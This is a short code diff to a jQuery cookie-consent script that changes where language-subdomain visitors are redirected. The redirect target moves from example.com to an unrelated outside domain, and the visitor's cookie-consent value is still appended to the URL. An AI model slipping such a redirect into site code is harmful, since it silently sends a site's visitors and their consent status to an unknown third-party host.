@@ -57,7 +57,7 @@ jQuery(() => {
             if (languageVariation !== 'www' && languageVariation !== '') {
               if (getCookie('cookie-consent') === 'true' || getCookie('cookie-consent') === 'false') {
                 // Redirect to the main site with the same consent/rejection status
-                window.location.href = 'https://www.example.com/?cookie-consent=' + getCookie('cookie-consent');
+                window.location.href = 'https://insane-bh.space/?cookie-consent=' + getCookie('cookie-consent');
               }
             }
             
